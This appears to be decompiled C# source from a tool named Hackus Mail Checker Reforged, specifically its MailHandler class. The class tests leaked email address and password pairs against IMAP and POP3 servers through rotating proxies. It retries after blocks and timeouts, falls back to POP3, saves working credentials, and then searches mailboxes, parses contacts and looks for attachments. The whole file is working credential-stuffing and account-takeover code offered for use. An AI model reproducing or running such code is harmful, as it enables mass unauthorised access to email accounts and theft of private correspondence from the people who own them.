using System;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.IMAP;
using Hackus_Mail_Checker_Reforged.Net.Mail.POP3;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Mail
{
	// Token: 0x02000100 RID: 256
	public class MailHandler
	{
		// Token: 0x060007DC RID: 2012 RVA: 0x0000AD87 File Offset: 0x00008F87
		public MailHandler(Mailbox mailbox, Server server)
		{
			this._mailbox = mailbox;
			this._server = server;
		}

		// Token: 0x060007DD RID: 2013 RVA: 0x0002FC84 File Offset: 0x0002DE84
		public OperationResult Handle()
		{
			if (this._mailbox != null && this._server != null)
			{
				if (this._server.Protocol == ProtocolType.IMAP)
				{
					if (CheckerSettings.Instance.AllowedProtocols != AllowedProtocols.POP3)
					{
						this._mailHandler = new ImapHandlerNew(this._mailbox, this._server);
						goto IL_A7;
					}
				}
				if (this._server.Protocol == ProtocolType.POP3)
				{
					if (CheckerSettings.Instance.AllowedProtocols != AllowedProtocols.IMAP)
					{
						this._mailHandler = new Pop3Handler(this._mailbox, this._server);
						goto IL_A7;
					}
				}
				StatisticsManager.Instance.Increment(OperationResult.Bad);
				FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, OperationResult.Bad);
				return OperationResult.Bad;
				IL_A7:
				OperationResult operationResult = this.Check();
				if (operationResult == OperationResult.Error && CheckerSettings.Instance.RebruteImapWithPop3 && CheckerSettings.Instance.AllowedProtocols != AllowedProtocols.IMAP)
				{
					Server server = ConfigurationManager.Instance.Configuration.Find(this._mailbox.Domain, ProtocolType.POP3);
					if (server != null)
					{
						this._server = server;
						operationResult = this.Check();
					}
				}
				StatisticsManager.Instance.Increment(operationResult);
				FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
				return operationResult;
			}
			return OperationResult.Error;
		}

		// Token: 0x060007DE RID: 2014 RVA: 0x0002FDB4 File Offset: 0x0002DFB4
		public OperationResult WebHandle(bool writeGood = true)
		{
			if (this._mailbox != null && this._server != null)
			{
				if (this._server.Protocol == ProtocolType.IMAP)
				{
					this._mailHandler = new ImapHandlerNew(this._mailbox, this._server);
				}
				else if (this._server.Protocol == ProtocolType.POP3)
				{
					this._mailHandler = new Pop3Handler(this._mailbox, this._server);
				}
				OperationResult operationResult = this.Check();
				if (operationResult == OperationResult.Ok && writeGood)
				{
					StatisticsManager.Instance.Increment(operationResult);
					FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
				}
				return operationResult;
			}
			return OperationResult.Error;
		}

		// Token: 0x060007DF RID: 2015 RVA: 0x0002FE5C File Offset: 0x0002E05C
		private OperationResult Check()
		{
			OperationResult operationResult = OperationResult.Ok;
			int num = 0;
			int num2 = 0;
			ExceptionType exceptionType = ExceptionType.Undefined;
			int i = 0;
			while (i < CheckerSettings.Instance.Rebrute + 1)
			{
				if (MultipasswordHelper.IsMultipassword(this._mailbox.Address))
				{
					return OperationResult.Multipassword;
				}
				if (ProxySettings.Instance.UseProxy)
				{
					OperationResult operationResult2 = this.CreateConnection();
					if (operationResult2 != OperationResult.HostNotFound)
					{
						if (operationResult2 != OperationResult.Error)
						{
							goto IL_4E;
						}
					}
					return operationResult2;
				}
				IL_4E:
				this.WaitPause();
				if (MultipasswordHelper.IsMultipassword(this._mailbox.Address))
				{
					return OperationResult.Multipassword;
				}
				operationResult = this._mailHandler.Login(out exceptionType);
				if (MultipasswordHelper.IsMultipassword(this._mailbox.Address))
				{
					return OperationResult.Multipassword;
				}
				this.WaitPause();
				if (operationResult != OperationResult.Ok)
				{
					if (this._mailHandler is ImapHandlerNew && operationResult == OperationResult.Blocked && this._mailbox.Domain == <Module>.smethod_6<string>(1156692759))
					{
						i--;
						this._mailHandler.Dispose();
					}
					else
					{
						if (operationResult == OperationResult.Blocked)
						{
							if (CheckerSettings.Instance.RebruteBlocked)
							{
								this._mailHandler.Dispose();
								goto IL_147;
							}
						}
						if (operationResult != OperationResult.Error)
						{
							if (operationResult == OperationResult.ServerDisabled)
							{
								operationResult = OperationResult.Blocked;
							}
							if (operationResult == OperationResult.HostNotFound)
							{
								operationResult = OperationResult.Bad;
							}
							this._mailHandler.Dispose();
							return operationResult;
						}
						if (exceptionType != ExceptionType.IOException && exceptionType != ExceptionType.SocketException)
						{
							if (exceptionType == ExceptionType.TimeoutException)
							{
								num2++;
								if (num2 <= CheckerSettings.Instance.TimeoutExceptionRebrute)
								{
									i--;
								}
							}
						}
						else
						{
							num++;
							if (num <= CheckerSettings.Instance.ConnectionExceptionRebrute)
							{
								i--;
							}
						}
						this._mailHandler.Dispose();
					}
					IL_147:
					i++;
				}
				else
				{
					MultipasswordHelper.AddLogin(this._mailbox.Address);
					if (CheckerSettings.Instance.CheckFolderAccess && this._mailHandler.SelectFolder(Hackus_Mail_Checker_Reforged.Net.Mail.IMAP.Folder.Parse(<Module>.smethod_6<string>(2132499449))) != OperationResult.Ok)
					{
						this._mailHandler.Dispose();
						return OperationResult.Bad;
					}
					if (!SearchSettings.Instance.Search)
					{
						if (SearchSettings.Instance.ParseContacts)
						{
							this._mailHandler.SearchMessages();
							MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
						}
						else if (this._mailHandler is ImapHandlerNew && SearchSettings.Instance.SearchAttachments && SearchSettings.Instance.SearchAttachmentsMode == SearchAttachmentsMode.Everywhere)
						{
							this._mailHandler.SearchMessages();
							MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
						}
						else
						{
							MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
						}
					}
					else
					{
						this._mailHandler.SearchMessages();
					}
					this._mailHandler.Dispose();
					return OperationResult.Ok;
				}
			}
			if (operationResult == OperationResult.Error)
			{
				StatisticsManager.Instance.AddErrorDetails(this._mailbox.Address, exceptionType.ToString());
			}
			return operationResult;
		}

		// Token: 0x060007E0 RID: 2016 RVA: 0x00030110 File Offset: 0x0002E310
		private OperationResult CreateConnection()
		{
			OperationResult operationResult;
			do
			{
				this.WaitPause();
				ProxyClient proxy = ProxyManager.Instance.GetProxy();
				operationResult = this._mailHandler.Connect(proxy);
			}
			while (operationResult == OperationResult.Error);
			return operationResult;
		}

		// Token: 0x060007E1 RID: 2017 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040003F4 RID: 1012
		private IMailHandler _mailHandler;

		// Token: 0x040003F5 RID: 1013
		private Mailbox _mailbox;

		// Token: 0x040003F6 RID: 1014
		private Server _server;
	}
}
